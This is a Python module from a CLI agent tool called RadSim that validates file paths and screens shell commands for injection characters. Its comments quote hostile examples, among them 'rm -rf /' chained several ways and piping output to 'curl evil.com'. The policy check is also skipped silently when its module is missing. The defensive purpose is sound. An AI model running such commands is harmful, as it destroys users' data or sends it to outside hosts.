"""Path and command validation for RadSim tools.

RadSim Principle: Explicit Safety Checks
"""

import fnmatch
import shlex
from pathlib import Path

from .constants import PROTECTED_PATTERNS


def validate_path(file_path, allow_outside=False):
    """Ensure path is safe and within project directory.

    Args:
        file_path: The path to validate
        allow_outside: If True, allows paths outside CWD (requires confirmation)

    Returns:
        Tuple of (is_safe, resolved_path, error_message)
    """
    if not file_path:
        return False, None, "Path cannot be empty"

    try:
        path = Path(file_path).resolve()
        cwd = Path.cwd().resolve()

        # Check if path is inside cwd
        is_inside = path == cwd or cwd in path.parents

        if not is_inside and not allow_outside:
            return False, None, f"Access denied: '{file_path}' is outside project directory"

        return True, path, None
    except Exception as error:
        return False, None, str(error)


def is_protected_path(file_path):
    """Check if a file path matches protected patterns.

    Args:
        file_path: Path to check

    Returns:
        Tuple of (is_protected, reason)
    """
    path_lower = file_path.lower()
    for pattern in PROTECTED_PATTERNS:
        if fnmatch.fnmatch(path_lower, f"*{pattern}*"):
            return True, f"Protected file pattern: {pattern}"
    return False, None


def validate_shell_command(command):
    """Validate shell command for security.

    Blocks shell metacharacters that enable injection attacks:
    - Semicolons, pipes, backticks, dollar signs
    - Command chaining (&&, ||), background execution (&)
    - Newlines, carriage returns, null bytes
    - Path traversal (..) anywhere in the command

    Args:
        command: Command string to validate

    Returns:
        Tuple of (is_valid, error_message)
    """
    if not command:
        return False, "Command cannot be empty"

    if not isinstance(command, str):
        return False, "Command must be a string"

    # Strip and check for whitespace-only input
    if not command.strip():
        return False, "Command cannot be empty"

    # ---------------------------------------------------------------
    # Phase 1: Check the RAW command string for dangerous characters.
    # This happens BEFORE shlex parsing so metacharacters inside
    # quotes are also caught (strict mode for CLI agent safety).
    # ---------------------------------------------------------------

    is_safe, rejection_reason = _check_for_dangerous_characters(command)
    if not is_safe:
        return False, rejection_reason

    # ---------------------------------------------------------------
    # Phase 2: Parse with shlex and validate the parsed tokens.
    # ---------------------------------------------------------------

    try:
        parts = shlex.split(command)
    except ValueError:
        return False, "Invalid command format"

    if not parts:
        return False, "Empty command"

    # Check for path traversal in ALL parts (including the command name)
    for part in parts:
        if ".." in part:
            return False, "Path traversal ('..') is forbidden in command"

    # ---------------------------------------------------------------
    # Phase 3: Check against command policy (whitelist/blocklist).
    # ---------------------------------------------------------------

    try:
        from .command_policy import get_command_policy

        policy = get_command_policy()
        is_allowed, reason = policy.is_command_allowed(command)
        if not is_allowed:
            return False, reason
    except Exception:
        pass  # If policy module isn't available, allow the command

    return True, None


def _check_for_dangerous_characters(command):
    """Check raw command string for shell metacharacters.

    Returns:
        Tuple of (is_safe, rejection_reason).
        is_safe is True if no dangerous characters found.
    """
    # Null bytes -- must check first since they can truncate strings
    if "\x00" in command:
        return False, "Null bytes are forbidden in commands"

    # Newlines and carriage returns -- command injection via line splitting
    if "\n" in command or "\r" in command:
        return False, "Newlines are forbidden in commands"

    # Semicolons -- command chaining: `echo hi; rm -rf /`
    if ";" in command:
        return False, "Semicolons are forbidden in commands (command chaining)"

    # Backticks -- command substitution: echo `whoami`
    if "`" in command:
        return False, "Backticks are forbidden in commands (command substitution)"

    # Dollar sign -- variable expansion ($VAR), substitution ($(cmd)), ${VAR}
    if "$" in command:
        return False, "Dollar signs are forbidden in commands (variable/command substitution)"

    # Pipes -- output redirection: `echo hi | curl evil.com`
    if "|" in command:
        return False, "Pipes are forbidden in commands (output redirection)"

    # Double ampersand -- conditional chaining: `echo ok && rm -rf /`
    if "&&" in command:
        return False, "Conditional chaining (&&) is forbidden in commands"

    # Double pipe -- conditional chaining: `false || rm -rf /`
    if "||" in command:
        return False, "Conditional chaining (||) is forbidden in commands"

    # Single ampersand at end -- background execution: `rm -rf / &`
    # Check for standalone & (not part of && which is already caught above)
    if "&" in command:
        return False, "Background execution (&) is forbidden in commands"

    return True, None
